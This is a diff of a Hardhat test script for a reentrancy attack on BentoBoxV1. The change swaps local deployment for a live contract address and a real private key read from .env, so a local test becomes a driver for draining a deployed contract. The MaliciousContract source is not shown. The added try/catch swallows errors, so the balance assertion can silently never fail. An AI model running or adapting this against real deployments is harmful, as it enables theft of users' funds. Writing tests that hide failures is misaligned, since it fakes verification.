@@ -1,37 +1,52 @@
 const { ethers } = require("hardhat");
 const { expect } = require("chai");
+require("dotenv").config();
 
 describe("BentoBoxV1 Reentrancy Attack Test", function () {
     let deployer, attacker;
     let bentoBox, maliciousContract;
 
     before(async function () {
-        [deployer, attacker] = await ethers.getSigners();
+        [deployer] = await ethers.getSigners();
 
-        // Deploy BentoBox and MockWETH contracts here
-        // Example:
-        const BentoBox = await ethers.getContractFactory("BentoBoxV1");
-        bentoBox = await BentoBox.deploy(WETH_ADDRESS);
-        await bentoBox.deployed();
+        // Initialize the attacker with the private key and connect to the provider
+        attacker = new ethers.Wallet(process.env.PRIVATE_KEY, ethers.provider);
 
-        const MaliciousContract = await ethers.getContractFactory("MaliciousContract");
+        // Connect to the BentoBox contract using the address from .env
+        const BentoBox = await ethers.getContractAt("BentoBoxV1", process.env.BENTOBOX_ADDRESS);
+        bentoBox = BentoBox.connect(deployer);
+        console.log("Connected to BentoBox at:", bentoBox.address);
+
+        // Deploy MaliciousContract targeting BentoBox
+        const MaliciousContract = await ethers.getContractFactory("MaliciousContract", attacker);
         maliciousContract = await MaliciousContract.deploy(bentoBox.address);
         await maliciousContract.deployed();
+        console.log("MaliciousContract deployed to:", maliciousContract.address);
     });
 
     it("should exploit reentrancy vulnerability in withdraw", async function () {
-        // Initial balance before the attack
-        const initialBalance = await ethers.provider.getBalance(attacker.address);
-        console.log("Attacker initial balance:", initialBalance.toString());
+        try {
+            // Check the initial balance of the attacker
+            const initialBalance = await ethers.provider.getBalance(attacker.address);
+            console.log("Attacker initial balance:", ethers.utils.formatEther(initialBalance), "ETH");
 
-        // Initiate the attack
-        await maliciousContract.connect(attacker).attack();
+            // Perform the attack with correctly structured transaction overrides
+            const tx = await maliciousContract.connect(attacker).attack({
+                gasLimit: 5000000, // Set the gas limit for the transaction
+                // value: ethers.utils.parseEther("1.0") // Uncomment if sending Ether is necessary
+            });
 
-        // Final balance after the attack
-        const finalBalance = await ethers.provider.getBalance(attacker.address);
-        console.log("Attacker final balance:", finalBalance.toString());
+            const receipt = await tx.wait();
+            console.log("Attack executed, transaction hash:", receipt.transactionHash);
 
-        // Assert that the attacker's balance increased
-        expect(finalBalance).to.be.gt(initialBalance);
+            // Check the final balance of the attacker
+            const finalBalance = await ethers.provider.getBalance(attacker.address);
+            console.log("Attacker final balance:", ethers.utils.formatEther(finalBalance), "ETH");
+
+            // Assert that the attacker's balance has increased
+            expect(finalBalance).to.be.gt(initialBalance);
+        } catch (error) {
+            console.error("Error during attack:", error);
+        }
     });
 });
